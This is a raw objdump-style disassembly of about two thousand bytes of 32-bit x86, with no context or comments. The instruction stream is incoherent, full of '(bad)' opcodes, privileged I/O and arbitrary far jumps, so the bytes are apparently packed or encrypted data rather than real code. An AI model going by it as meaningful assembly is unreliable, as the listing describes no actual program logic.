  4156a4:	or     BYTE PTR [ebx-0x7f14ef5c],dh
  4156aa:	jae    0x41570b
  4156ac:	push   ss
  4156ad:	inc    eax
  4156ae:	jmp    DWORD PTR [eax]
  4156b0:	sbb    DWORD PTR [ebp+0x7b],ecx
  4156b3:	cmp    al,0xe9
  4156b5:	xor    DWORD PTR [eax],edx
  4156b7:	loopne 0x4156e6
  4156b9:	shl    DWORD PTR [ebp-0x75],1
  4156bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156bd:	adc    al,0xbb
  4156bf:	push   ebp
  4156c0:	push   ebx
  4156c1:	cmp    eax,0x32ed707a
  4156c6:	sbb    eax,0xa0239445
  4156cb:	ss ds pop edi
  4156ce:	adc    eax,0x47a1579a
  4156d3:	adc    bl,BYTE PTR [ecx+0x6b24d7c9]
  4156d9:	mov    al,ds:0x13a91fd2
  4156de:	sbb    BYTE PTR [esi+ebx*2],bl
  4156e1:	and    dh,BYTE PTR [eax-0x7088dfd1]
  4156e7:	pop    ebx
  4156e8:	mov    ebx,0x753ddb97
  4156ed:	mov    ah,0x2d
  4156ef:	fdivrp st(1),st
  4156f1:	adc    eax,0xe37cba1c
  4156f6:	hlt    
  4156f7:	mov    eax,DWORD PTR [ebx+0x573b0329]
  4156fd:	xor    ecx,ebx
  4156ff:	xchg   esi,eax
  415700:	pop    ebp
  415701:	fst    QWORD PTR [esp+edi*8]
  415704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415705:	cdq    
  415706:	jb     0x4156e4
  415708:	sub    al,0xfa
  41570a:	push   esp
  41570b:	fldenv [ecx]
  41570d:	mov    ebp,0x3c515998
  415712:	loope  0x4156cb
  415714:	mov    esp,0xd343bcb
  415719:	in     al,dx
  41571a:	jmp    0x4156b4
  41571c:	pop    es
  41571d:	enter  0x5ce3,0x90
  415721:	or     eax,0xf2a606a5
  415726:	mov    dl,0x67
  415728:	pop    ds
  415729:	jbe    0x4156b1
  41572b:	mov    es,WORD PTR [edi]
  41572d:	jmp    0x41571a
  41572f:	sbb    DWORD PTR [esi-0x11],esp
  415732:	sub    DWORD PTR [edi+eax*8],0xa
  415736:	mov    bl,0xaa
  415738:	out    dx,al
  415739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41573a:	js     0x41572a
  41573c:	push   es
  41573d:	std    
  41573e:	les    ebp,FWORD PTR [esi-0x4270c252]
  415744:	outs   dx,DWORD PTR ds:[esi]
  415745:	push   0x262fd932
  41574a:	xor    eax,0x2543554e
  41574f:	sbb    BYTE PTR ds:[eax],0x18
  415753:	cmp    ah,BYTE PTR [edi+0x8120fa9]
  415759:	enter  0xeb99,0xe1
  41575d:	add    ch,ch
  41575f:	xchg   ebx,eax
  415760:	jle    0x415708
  415762:	aas    
  415763:	xchg   edi,eax
  415764:	clc    
  415765:	inc    edx
  415766:	adc    DWORD PTR [edi-0x6e],esp
  415769:	jecxz  0x41574b
  41576b:	sbb    dl,BYTE PTR [ebp-0x35]
  41576e:	outs   dx,DWORD PTR ds:[esi]
  41576f:	adc    ch,bl
  415771:	mov    ah,0x38
  415773:	lahf   
  415774:	mov    eax,0x3415eb83
  415779:	rep stos BYTE PTR es:[edi],al
  41577b:	rcr    BYTE PTR [ebp-0x4d],1
  41577e:	pop    edi
  41577f:	outs   dx,BYTE PTR ds:[esi]
  415780:	xlat   BYTE PTR ds:[ebx]
  415781:	xlat   BYTE PTR ds:[ebx]
  415782:	cmp    DWORD PTR [esi-0x35538e33],0x8f9e3665
  41578c:	arpl   cx,bp
  41578e:	pop    esi
  41578f:	imul   ebp,ebp,0xffc4c9c6
  415795:	jo     0x4157d9
  415797:	and    BYTE PTR [ecx],ah
  415799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41579a:	das    
  41579b:	push   edi
  41579c:	xchg   ebx,eax
  41579d:	and    eax,0xfde66694
  4157a2:	add    dh,BYTE PTR [ebp-0x51]
  4157a5:	mov    bh,0x3d
  4157a7:	cs cli 
  4157a9:	and    bl,BYTE PTR [eax-0x1]
  4157ac:	push   edx
  4157ad:	bound  eax,QWORD PTR [eax+0x520ea637]
  4157b3:	add    ch,BYTE PTR [edx+0x5706364a]
  4157b9:	add    dl,BYTE PTR [edi-0x17]
  4157bc:	lods   al,BYTE PTR ds:[esi]
  4157bd:	and    DWORD PTR [ebp-0x48],ecx
  4157c0:	adc    al,0x83
  4157c2:	sub    al,0xe2
  4157c4:	retf   
  4157c5:	jb     0x4157fc
  4157c7:	test   BYTE PTR [ebp-0x25],0xe2
  4157cb:	xor    bh,BYTE PTR [ecx]
  4157cd:	lea    edi,[edx-0x47]
  4157d0:	cmp    BYTE PTR [esi+0x49b9e3b4],cl
  4157d6:	loope  0x41577f
  4157d8:	setle  al
  4157db:	retf   0xbf65
  4157de:	test   DWORD PTR [eax-0x41129668],esi
  4157e4:	jecxz  0x41583e
  4157e6:	xor    eax,0xb527f474
  4157eb:	mov    edi,ebx
  4157ed:	je     0x4157d1
  4157ef:	stc    
  4157f0:	cmp    al,0x23
  4157f2:	out    dx,al
  4157f3:	dec    ebp
  4157f4:	push   esi
  4157f5:	fsubr  QWORD PTR [ecx-0x4ce49eb4]
  4157fb:	xchg   ecx,eax
  4157fc:	and    dl,BYTE PTR [ebx-0x1e1498d6]
  415802:	in     eax,dx
  415803:	lods   eax,DWORD PTR ds:[esi]
  415804:	pop    ebx
  415805:	cmp    dh,dh
  415807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415808:	stc    
  415809:	pop    es
  41580a:	(bad)  
  41580b:	push   0x2a
  41580d:	bound  ecx,QWORD PTR [edi+ebx*2+0x1a]
  415811:	mov    ds:0x9da3eac8,eax
  415816:	retf   
  415817:	jne    0x415808
  415819:	mov    ds:0x3eab29f4,al
  41581e:	ror    bl,0x29
  415821:	fs (bad) 
  415824:	push   ds
  415825:	inc    ebx
  415826:	pop    ecx
  415827:	inc    ebp
  415828:	mov    ecx,0x4e07b8b3
  41582d:	pushf  
  41582e:	jp     0x415829
  415830:	das    
  415831:	cmp    al,0xc5
  415833:	ret    0xc78c
  415836:	push   cs
  415837:	cmp    eax,0x6f472ba0
  41583c:	add    esp,DWORD PTR [edi+0x43]
  41583f:	inc    esi
  415840:	and    al,0xe1
  415842:	inc    esp
  415843:	mov    ecx,0xd73cd8bb
  415848:	dec    ebx
  415849:	fwait
  41584a:	cmp    BYTE PTR [ebx+0x6a],ah
  41584d:	sbb    ecx,DWORD PTR [eax+0xb]
  415850:	(bad)  
  415851:	imul   ecx,DWORD PTR [esi-0xf],0xfffffff1
  415855:	dec    esp
  415856:	dec    esp
  415857:	stc    
  415858:	cwde   
  415859:	imul   edx,DWORD PTR [ebx],0xcba69810
  41585f:	pop    ebp
  415860:	add    al,BYTE PTR [ebx+edi*1+0x51]
  415864:	ins    BYTE PTR es:[edi],dx
  415865:	enter  0x9589,0x69
  415869:	push   ss
  41586a:	inc    eax
  41586b:	sbb    edi,DWORD PTR [esi+0x55da6634]
  415871:	push   edx
  415872:	jge    0x41583d
  415874:	addr16 (bad) 
  415876:	aam    0x30
  415878:	inc    eax
  415879:	repz dec ebx
  41587b:	push   es
  41587c:	jno    0x41582f
  41587e:	out    0x12,eax
  415880:	jge    0x415823
  415882:	dec    ecx
  415883:	fcomp  DWORD PTR [edx-0x305ec59d]
  415889:	mov    eax,0xd99d6971
  41588e:	ins    BYTE PTR es:[edi],dx
  41588f:	jg     0x415890
  415891:	shl    BYTE PTR [esi],cl
  415893:	test   al,0xa6
  415895:	cmp    eax,0x446d6544
  41589a:	dec    edi
  41589b:	dec    esi
  41589c:	ss cmc 
  41589e:	push   0xffffffc7
  4158a0:	arpl   si,sp
  4158a2:	or     BYTE PTR [edi+0xefbf9e9],bh
  4158a8:	sbb    al,0x8e
  4158aa:	dec    ecx
  4158ab:	mov    ds:0x16628be6,eax
  4158b0:	scas   al,BYTE PTR es:[edi]
  4158b1:	fcomi  st,st(5)
  4158b3:	cmp    bl,al
  4158b5:	inc    eax
  4158b6:	jb     0x4158b3
  4158b8:	jl     0x4158cf
  4158ba:	mov    fs,WORD PTR [ebx-0x39]
  4158bd:	jecxz  0x415898
  4158bf:	fs dec esp
  4158c1:	sub    edi,DWORD PTR [edx-0x7d2d139]
  4158c7:	dec    ebx
  4158c8:	cmp    eax,0xc8a95dbc
  4158cd:	pop    ss
  4158ce:	lea    esi,[eax-0x27]
  4158d1:	sbb    al,0x14
  4158d3:	xor    bh,BYTE PTR [edx-0x21adf18]
  4158d9:	pop    edx
  4158da:	add    bh,BYTE PTR [ebp+0x1ef2fc5f]
  4158e0:	enter  0x508b,0xaa
  4158e4:	lods   al,BYTE PTR ds:[esi]
  4158e5:	(bad)  
  4158e7:	adc    BYTE PTR [edx+0x37b3898a],ah
  4158ed:	inc    ecx
  4158ee:	xor    eax,0xc1270ded
  4158f3:	mov    al,ds:0x64101baf
  4158f8:	push   ebp
  4158f9:	ret    0x89ac
  4158fc:	jl     0x41595c
  4158fe:	ret    
  4158ff:	inc    eax
  415900:	pop    ds
  415901:	mov    ss,WORD PTR [edx+ebp*1]
  415904:	mov    ah,0x6a
  415906:	addr16 push ecx
  415908:	mov    ds:0xae2131e3,eax
  41590d:	mov    dh,ch
  41590f:	pop    ss
  415910:	mov    ebp,0x1cddeb05
  415915:	dec    ecx
  415916:	pop    esp
  415917:	push   esp
  415918:	je     0x415948
  41591a:	fdiv   DWORD PTR [esp+edx*2]
  41591d:	mov    bh,0x58
  41591f:	dec    esi
  415920:	imul   ebp,DWORD PTR [edi-0x4fc663c1],0xfffffffd
  415927:	stos   DWORD PTR es:[edi],eax
  415928:	push   ebx
  415929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41592a:	mov    WORD PTR [eax+edx*8+0x74],ss
  41592e:	mov    ecx,0xbe8b7662
  415933:	mov    ds:0x82356d7,al
  415938:	xchg   BYTE PTR [esi+edi*8+0x70],bl
  41593c:	sbb    dl,bl
  41593e:	jne    0x4158c1
  415940:	push   esp
  415941:	int3   
  415942:	ss inc esi
  415944:	mov    esi,0x629ebb8e
  415949:	dec    ebp
  41594a:	mov    ebx,0x91d8b68c
  41594f:	sub    DWORD PTR ds:0x414e735c,esi
  415955:	(bad)  
  415956:	pop    ss
  415957:	les    esi,FWORD PTR [edi-0x13c0b1d9]
  41595d:	inc    ebx
  41595e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41595f:	add    BYTE PTR ds:[edx+0x5f],ah
  415963:	cmp    DWORD PTR [ebp-0x7],ecx
  415966:	xchg   edi,eax
  415967:	out    dx,al
  415968:	daa    
  415969:	mov    dl,ah
  41596b:	shl    DWORD PTR [ebx+0x6faaed44],1
  415971:	dec    edx
  415972:	in     eax,dx
  415973:	mov    ah,0xe6
  415975:	inc    edi
  415976:	add    BYTE PTR [ecx+0x4d],0xe2
  41597a:	pop    ds
  41597b:	jle    0x41591c
  41597d:	and    BYTE PTR [ebp-0xd],bl
  415980:	xor    bh,BYTE PTR [esi-0x72]
  415983:	jmp    0x41597a
  415985:	imul   esp
  415987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415988:	add    edx,DWORD PTR [eax+0x17ba7dcb]
  41598e:	cmp    eax,DWORD PTR [eax]
  415990:	pusha  
  415991:	dec    eax
  415992:	inc    ebp
  415993:	lds    edi,FWORD PTR [edx-0x61676819]
  415999:	cli    
  41599a:	repz mov eax,ds:0x1a46904e
  4159a0:	jg     0x415924
  4159a2:	lahf   
  4159a3:	stc    
  4159a4:	fisttp QWORD PTR [ebx+0x0]
  4159a7:	fnstenv [edi+edi*8]
  4159aa:	xor    eax,esi
  4159ac:	sti    
  4159ad:	adc    DWORD PTR [ebx+0x74],eax
  4159b0:	or     BYTE PTR [eax],bh
  4159b2:	pop    esp
  4159b3:	shl    BYTE PTR [eax],0x90
  4159b6:	mov    bl,0x91
  4159b8:	jle    0x415984
  4159ba:	pop    ds
  4159bb:	xchg   esi,eax
  4159bc:	xor    eax,0x5e1451d0
  4159c1:	cld    
  4159c2:	mov    ebx,0xdb458160
  4159c7:	sub    BYTE PTR [edi],dh
  4159c9:	sbb    ebx,DWORD PTR [ecx]
  4159cb:	mov    BYTE PTR [esi+0x5ac267d7],ah
  4159d1:	jle    0x415988
  4159d3:	imul   esp,DWORD PTR [ecx+0x1c],0xffffff8d
  4159d7:	lods   al,BYTE PTR ds:[esi]
  4159d8:	gs jmp 0x9258d288
  4159de:	jle    0x41597f
  4159e0:	and    eax,0x536ef6b3
  4159e5:	fistp  DWORD PTR [ebx-0x171a78ef]
  4159eb:	pusha  
  4159ec:	push   esp
  4159ed:	or     eax,0xd1c4d488
  4159f2:	adc    eax,0x5434fa27
  4159f7:	mov    ah,0x49
  4159f9:	ficom  DWORD PTR [esi]
  4159fb:	fwait
  4159fc:	and    dh,BYTE PTR [edx-0x79]
  4159ff:	ret    
  415a00:	sbb    bl,BYTE PTR [ebp-0x390f9600]
  415a06:	clc    
  415a07:	das    
  415a08:	ficomp WORD PTR [esi-0x4947eb59]
  415a0e:	cmp    al,0xfc
  415a10:	pushf  
  415a11:	data16 int 0x5e
  415a14:	jo     0x41599e
  415a16:	stos   DWORD PTR es:[edi],eax
  415a17:	adc    bh,BYTE PTR [ecx+0x71]
  415a1a:	clc    
  415a1b:	scas   al,BYTE PTR es:[edi]
  415a1c:	aas    
  415a1d:	popa   
  415a1e:	les    esp,FWORD PTR [eax+0x64175bce]
  415a24:	xchg   ecx,eax
  415a25:	push   ebx
  415a26:	popa   
  415a27:	into   
  415a28:	mov    al,0x90
  415a2a:	popa   
  415a2b:	pop    ebp
  415a2c:	jle    0x415a30
  415a2e:	imul   ebp,DWORD PTR [ebx],0x832b7176
  415a34:	mov    ecx,0x9ae20210
  415a39:	outs   dx,BYTE PTR ds:[esi]
  415a3a:	rcl    BYTE PTR [edx+0x44fd6fdc],0x86
  415a41:	push   fs
  415a43:	shr    DWORD PTR [edi],cl
  415a45:	fwait
  415a46:	and    ecx,eax
  415a48:	retf   0x7628
  415a4b:	xchg   esp,eax
  415a4c:	hlt    
  415a4d:	aad    0x41
  415a4f:	sub    BYTE PTR ds:0xcc61d683,dh
  415a55:	mov    ah,0xcc
  415a57:	pop    esi
  415a58:	jb     0x4159ea
  415a5a:	mov    dl,0x5a
  415a5c:	in     eax,dx
  415a5d:	loope  0x4159f1
  415a5f:	cmc    
  415a60:	jo     0x415a9c
  415a62:	sub    DWORD PTR [edx-0x5623d123],esi
  415a68:	test   bl,dh
  415a6a:	aas    
  415a6b:	stc    
  415a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a6d:	test   BYTE PTR [ecx+ebx*4+0x63f3da],dl
  415a74:	pop    ebx
  415a75:	aaa    
  415a76:	cmp    ebp,ebp
  415a78:	xchg   esi,eax
  415a79:	or     al,0x46
  415a7b:	xor    BYTE PTR [esi],ch
  415a7d:	ficomp WORD PTR [edi+0x13]
  415a80:	in     eax,dx
  415a81:	ds inc eax
  415a83:	adc    esi,esp
  415a85:	into   
  415a86:	ret    
  415a87:	cmc    
  415a88:	xor    dh,cl
  415a8a:	scas   eax,DWORD PTR es:[edi]
  415a8b:	lock in eax,0xb0
  415a8e:	xor    DWORD PTR [edi-0x2f76927b],0xdd35f2a
  415a98:	leave  
  415a99:	outs   dx,BYTE PTR ds:[esi]
  415a9a:	ins    BYTE PTR es:[edi],dx
  415a9b:	sahf   
  415a9c:	adc    eax,0x7d4ade9b
  415aa1:	dec    edi
  415aa2:	push   edi
  415aa3:	xor    al,0xec
  415aa5:	lods   eax,DWORD PTR ds:[esi]
  415aa6:	push   esp
  415aa7:	sub    DWORD PTR [ecx-0x554b7449],esi
  415aad:	cmp    eax,0xd694d095
  415ab2:	pop    ecx
  415ab3:	outs   dx,BYTE PTR ds:[esi]
  415ab4:	push   0xffffff83
  415ab6:	fs scas eax,DWORD PTR es:[edi]
  415ab8:	or     eax,0x51be575b
  415abd:	fld    TBYTE PTR [ebx+0x40e26734]
  415ac3:	lock mov cl,0x86
  415ac6:	jecxz  0x415a8c
  415ac8:	shl    BYTE PTR [edx],0x37
  415acb:	mov    ah,0xba
  415acd:	dec    edx
  415ace:	fucomip st,st(1)
  415ad0:	push   ecx
  415ad1:	arpl   WORD PTR [edi],sp
  415ad3:	outs   dx,DWORD PTR ds:[esi]
  415ad4:	inc    ebx
  415ad5:	stos   BYTE PTR es:[edi],al
  415ad6:	mul    BYTE PTR [ebx+0x18]
  415ad9:	pop    ecx
  415ada:	mov    ebp,0x2fe9789d
  415adf:	mov    dh,0x13
  415ae1:	imul   BYTE PTR [eax+0x1]
  415ae4:	gs popf 
  415ae6:	(bad)  
  415ae8:	(bad)  
  415ae9:	sahf   
  415aea:	(bad)  
  415aec:	adc    eax,0x9a1f7e51
  415af1:	(bad)  
  415af2:	xchg   ecx,eax
  415af3:	ss call 0x70fd:0x39d64dbb
  415afb:	xchg   esi,eax
  415afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415afd:	mov    ch,0x27
  415aff:	xor    DWORD PTR [eax],0x25ff431c
  415b05:	inc    ebx
  415b06:	gs loopne 0x415b54
  415b09:	fwait
  415b0a:	dec    esi
  415b0b:	mov    dl,0x9d
  415b0d:	jle    0x415b3f
  415b0f:	ficomp DWORD PTR [ebx]
  415b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b12:	dec    ebx
  415b13:	push   ecx
  415b14:	push   esi
  415b15:	jno    0x415aa8
  415b17:	test   BYTE PTR [esi-0x3b],0xd7
  415b1b:	or     DWORD PTR [ebp-0x75],0x65145279
  415b22:	and    DWORD PTR [eax-0x33e5b537],ebp
  415b28:	xor    edi,edi
  415b2a:	sti    
  415b2b:	push   ebp
  415b2c:	pop    esi
  415b2d:	xchg   BYTE PTR [edi+0x35],ch
  415b30:	bound  edx,QWORD PTR [edx]
  415b32:	add    al,0x9c
  415b34:	jne    0x415ac3
  415b36:	stos   BYTE PTR es:[edi],al
  415b37:	pop    esp
  415b38:	jge    0x415b5e
  415b3a:	jne    0x415af8
  415b3c:	inc    ebp
  415b3d:	mov    eax,0xf004151b
  415b42:	push   ebp
  415b43:	shl    dl,1
  415b45:	mov    gs,WORD PTR [ecx]
  415b47:	jne    0x415b32
  415b49:	cmp    eax,0x4da28162
  415b4e:	imul   ebp,DWORD PTR [eax],0xffffffa9
  415b51:	adc    eax,0x77ebbfd8
  415b56:	jmp    0x725e:0x82ba9d2a
  415b5d:	mov    ch,0xc2
  415b5f:	test   al,0xce
  415b61:	or     DWORD PTR fs:[esi-0x6ac5f936],0x70b0687d
  415b6c:	dec    edx
  415b6d:	(bad)  
  415b6e:	ud0    edx,DWORD PTR [eax-0x34]
  415b72:	popa   
  415b73:	aaa    
  415b74:	sbb    DWORD PTR ds:0x2672bfc2,ebx
  415b7a:	shr    BYTE PTR [esi+0x24],1
  415b7d:	repnz inc edi
  415b7f:	sbb    BYTE PTR [edx-0x2c94932f],bh
  415b85:	push   ebx
  415b86:	int    0xaf
  415b88:	inc    ebx
  415b89:	loope  0x415b4a
  415b8b:	sbb    eax,0xefdf7764
  415b90:	shr    al,1
  415b92:	jge    0x415bc4
  415b94:	out    dx,al
  415b95:	sub    BYTE PTR [ebp-0x25],dh
  415b98:	arpl   WORD PTR [ebx+ebp*8],ax
  415b9b:	or     DWORD PTR [edx+eax*2],ebx
  415b9e:	ds dec edi
  415ba0:	mov    bl,0xf0
  415ba2:	das    
  415ba3:	push   ebp
  415ba4:	stos   BYTE PTR es:[edi],al
  415ba5:	lock mov cl,0x4e
  415ba8:	jle    0x415b93
  415baa:	jne    0x415b67
  415bac:	pop    edx
  415bad:	in     eax,dx
  415bae:	adc    al,0x1f
  415bb0:	sti    
  415bb1:	inc    esi
  415bb2:	or     DWORD PTR [eax+0x1d],esi
  415bb5:	adc    DWORD PTR [eax],ebx
  415bb7:	mov    ecx,0x601cea98
  415bbc:	sbb    ah,0xf3
  415bbf:	lock addr16 xor eax,0x4cf7655a
  415bc6:	jne    0x415b7c
  415bc8:	retf   0xc2b2
  415bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bcc:	daa    
  415bcd:	fnstenv [ebx+0x49]
  415bd0:	cmp    BYTE PTR [eax+eiz*8+0x1c8fc194],dl
  415bd7:	dec    eax
  415bd8:	arpl   WORD PTR [ecx+eiz*4],di
  415bdb:	loope  0x415c5c
  415bdd:	mov    bl,0x58
  415bdf:	in     al,0xb
  415be1:	cmp    BYTE PTR [ebx+0x10b6f2b],cl
  415be7:	mov    edi,0xe6d5f045
  415bec:	pop    ebx
  415bed:	push   ecx
  415bee:	out    0x81,al
  415bf0:	jo     0x415bc6
  415bf2:	fiadd  WORD PTR [edx-0x6f]
  415bf5:	repnz imul esi,DWORD PTR ds:0xbf8f8b8b,0xfffffffd
  415bfd:	jne    0x415b9d
  415bff:	arpl   WORD PTR [esp+edi*1],si
  415c02:	fld    TBYTE PTR [edx+0x11]
  415c05:	mov    edx,0xfe8cbd74
  415c0a:	test   DWORD PTR [eax],ebx
  415c0c:	jbe    0x415c7f
  415c0e:	cmp    eax,0x1fa5fe02
  415c13:	clc    
  415c14:	gs addr16 pop ecx
  415c17:	dec    ebp
  415c18:	fisub  WORD PTR [edi]
  415c1a:	cmp    al,0x3c
  415c1c:	push   ebx
  415c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1e:	lods   al,BYTE PTR ds:[esi]
  415c1f:	repz daa 
  415c21:	iret   
  415c22:	jle    0x415c74
  415c24:	dec    esi
  415c25:	cli    
  415c26:	push   es
  415c27:	sbb    al,0x77
  415c29:	cmc    
  415c2a:	js     0x415bc4
  415c2c:	or     dh,BYTE PTR [ebp+ebp*4+0x4f]
  415c30:	mov    ss:0xbec18815,al
  415c36:	xchg   edx,eax
  415c37:	inc    esp
  415c38:	scas   eax,DWORD PTR es:[edi]
  415c39:	sbb    BYTE PTR [esi],cl
  415c3b:	out    dx,al
  415c3c:	(bad)  
  415c3d:	dec    ebp
  415c3e:	sbb    BYTE PTR [esi-0x2155baaf],0x66
  415c45:	aaa    
  415c46:	xor    al,0x39
  415c48:	ret    0xce04
  415c4b:	out    dx,al
  415c4c:	test   al,0x1
  415c4e:	and    al,0xee
  415c50:	loope  0x415bda
  415c52:	xchg   edi,eax
  415c53:	sbb    BYTE PTR [eax+0x18],ch
  415c56:	rcr    al,cl
  415c58:	popa   
  415c59:	xchg   ebp,eax
  415c5a:	push   ss
  415c5b:	repnz push ecx
  415c5d:	pushf  
  415c5e:	ror    edx,1
  415c60:	cli    
  415c61:	mov    ebx,0x88cbf5c2
  415c66:	bnd jmp 0x415c5b
  415c69:	xor    esp,ebx
  415c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c6c:	outs   dx,BYTE PTR ds:[esi]
  415c6d:	adc    edx,DWORD PTR [eax+0x40]
  415c70:	cdq    
  415c71:	or     al,0xbd
  415c73:	es cmp sp,ax
  415c77:	and    al,0x56
  415c79:	jp     0x415c3e
  415c7b:	push   edi
  415c7c:	and    edx,edx
  415c7e:	lea    esi,[ecx]
  415c80:	xor    al,0xd5
  415c82:	fdiv   DWORD PTR [edx+0x68]
  415c85:	mov    al,ds:0x2b5172cc
  415c8a:	sub    al,0xbe
  415c8c:	aaa    
  415c8d:	cmp    BYTE PTR [ecx-0x3a0689e5],bl
  415c93:	and    DWORD PTR [eax-0x2bf82e96],ecx
  415c99:	adc    ebp,DWORD PTR [eax-0x33]
  415c9c:	ja     0x415d15
  415c9e:	pushf  
  415c9f:	sahf   
  415ca0:	xchg   esp,eax
  415ca1:	aad    0xa7
  415ca3:	mov    ecx,ebp
  415ca5:	xchg   ecx,eax
  415ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ca7:	popa   
  415ca8:	xchg   ebx,eax
  415ca9:	arpl   WORD PTR [ebx-0x1e2eab00],di
  415caf:	lahf   
  415cb0:	mov    ds:0xcee650d4,al
  415cb5:	or     eax,0x8a191beb
  415cba:	sub    DWORD PTR [edx],ecx
  415cbc:	retf   
  415cbd:	push   ebp
  415cbe:	cmp    eax,edi
  415cc0:	mov    DWORD PTR [ebx+0x4e],ebx
  415cc3:	jp     0x415ca0
  415cc5:	mov    ?,WORD PTR [ebp-0x9b0b3ba]
  415ccb:	pop    esp
  415ccc:	aad    0x48
  415cce:	or     BYTE PTR [eax-0x7b9cbf6c],cl
  415cd4:	in     eax,dx
  415cd5:	xor    al,0x2b
  415cd7:	pop    ecx
  415cd8:	xor    ecx,DWORD PTR [edi+esi*8+0x4a]
  415cdc:	mov    ebp,0xa94f68c0
  415ce1:	or     DWORD PTR [edx],0x5dd227fb
  415ce7:	nop
  415ce8:	cmp    al,0x44
  415ceb:	aam    0x6
  415ced:	jle    0x415d36
  415cef:	jnp    0x415d54
  415cf1:	pop    esi
  415cf2:	jmp    0x415cb5
  415cf4:	and    BYTE PTR [eax],bh
  415cf6:	xor    ecx,esi
  415cf8:	pop    ebp
  415cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cfa:	jl     0x415cb9
  415cfc:	dec    esp
  415cfd:	jmp    0x777b1ec1
  415d02:	pop    edx
  415d03:	xchg   ebp,eax
  415d04:	dec    edx
  415d05:	fisubr WORD PTR [eax]
  415d07:	cmp    BYTE PTR [edx],cl
  415d09:	aaa    
  415d0a:	mov    ebp,0xdb013038
  415d0f:	xchg   ebx,eax
  415d10:	dec    esi
  415d11:	push   ebp
  415d12:	jmp    0xfcbb:0x4aefd481
  415d19:	fistp  WORD PTR [ebx-0x4fdd99b1]
  415d1f:	js     0x415d7f
  415d21:	repz mov dl,0x31
  415d24:	inc    ecx
  415d25:	shl    ebp,0xd4
  415d28:	mov    ds:0x10f6c495,al
  415d2d:	xchg   ebp,eax
  415d2e:	test   eax,0x7afa687f
  415d33:	rcr    DWORD PTR [ebx],1
  415d35:	jp     0x415d2d
  415d37:	cmp    eax,0xee4c0984
  415d3c:	enter  0x6acc,0xd7
  415d40:	xlat   BYTE PTR ds:[ebx]
  415d41:	push   ss
  415d42:	xor    bh,bh
  415d44:	and    al,0x12
  415d46:	ins    DWORD PTR es:[edi],dx
  415d47:	imul   ebp,DWORD PTR [eax+0x3],0xffffff96
  415d4b:	cmp    ch,BYTE PTR [eax-0x66c9e1ab]
  415d51:	mul    BYTE PTR [esi-0x5fbaa9e7]
  415d57:	xor    al,0x15
  415d59:	mov    al,ds:0xda865685
  415d5e:	sbb    al,0xc4
  415d60:	popa   
  415d61:	cmp    DWORD PTR [ebp+0x10fde16a],esi
  415d67:	push   eax
  415d68:	fisttp WORD PTR [esi+0x5d]
  415d6b:	and    ecx,DWORD PTR [edx-0x1be5476]
  415d71:	ins    DWORD PTR es:[edi],dx
  415d72:	dec    ebp
  415d73:	stc    
  415d74:	mov    ebp,ss
  415d76:	stos   DWORD PTR es:[edi],eax
  415d77:	mov    eax,ds:0x9ebec8a1
  415d7c:	int3   
  415d7d:	xor    esp,DWORD PTR [esi+0x32a6bb2b]
  415d83:	mov    WORD PTR [eax+0x75],es
  415d86:	mov    DWORD PTR [eax-0x67ac84fc],edi
  415d8c:	das    
  415d8d:	push   esp
  415d8e:	int    0xf6
  415d90:	jae    0x415dab
  415d92:	jno    0x415d6d
  415d94:	push   0x18e94c84
  415d99:	and    al,0x3d
  415d9b:	sbb    DWORD PTR [edx-0x52a9758a],edx
  415da1:	pop    DWORD PTR [edi]
  415da3:	add    eax,0x4dd3d0fa
  415da8:	inc    ebx
  415da9:	sbb    esp,DWORD PTR ds:0x15bef36
  415daf:	dec    ebx
  415db0:	xchg   edi,eax
  415db1:	xlat   BYTE PTR ds:[ebx]
  415db2:	les    ebx,FWORD PTR [ebp+0x57]
  415db5:	lods   al,BYTE PTR ds:[esi]
  415db6:	sbb    eax,0x977d0a52
  415dbb:	(bad)  
  415dbc:	sbb    al,0x6d
  415dbe:	inc    eax
  415dbf:	loopne 0x415e28
  415dc1:	adc    eax,0x58027c00
  415dc6:	jl     0x415d58
  415dc8:	jl     0x415d57
  415dca:	outs   dx,BYTE PTR ds:[esi]
  415dcb:	(bad)  
  415dcd:	cmp    esp,ebp
  415dcf:	push   ds
  415dd0:	xor    ebp,DWORD PTR [edx-0x64e02257]
  415dd6:	inc    esi
  415dd7:	or     al,0xa1
  415dd9:	pushf  
  415dda:	in     eax,dx
  415ddb:	test   BYTE PTR [ecx],al
  415ddd:	xor    al,0x47
  415ddf:	mov    bh,0xbe
  415de1:	shl    BYTE PTR [ecx],1
  415de3:	in     al,0x23
  415de5:	xor    eax,0xe345ea43
  415dea:	shl    DWORD PTR [ecx-0x53],1
  415ded:	add    DWORD PTR [eax-0x3bf10992],eax
  415df3:	shl    BYTE PTR [ecx],cl
  415df5:	xlat   BYTE PTR ds:[ebx]
  415df6:	mov    edi,0x4b2c428
  415dfb:	sbb    al,0x6e
  415dfd:	adc    ah,BYTE PTR [edx+esi*8-0x5353cb43]
  415e04:	dec    esi
  415e05:	xor    dl,bl
  415e07:	xor    cl,BYTE PTR [edi]
  415e09:	jle    0x415dc2
  415e0b:	or     al,0x4e
  415e0d:	ins    BYTE PTR es:[edi],dx
  415e0e:	xchg   DWORD PTR [ebx+0x64],esp
  415e11:	or     ch,BYTE PTR [ecx-0x2d]
  415e14:	dec    ebx
  415e15:	mov    ebx,0x27fd1e1
  415e1a:	repz popf 
  415e1c:	ins    DWORD PTR es:[edi],dx
  415e1d:	sbb    eax,DWORD PTR [ecx+0x2a]
  415e20:	dec    ebp
  415e21:	xchg   esp,eax
  415e22:	cmp    eax,0xc169d481
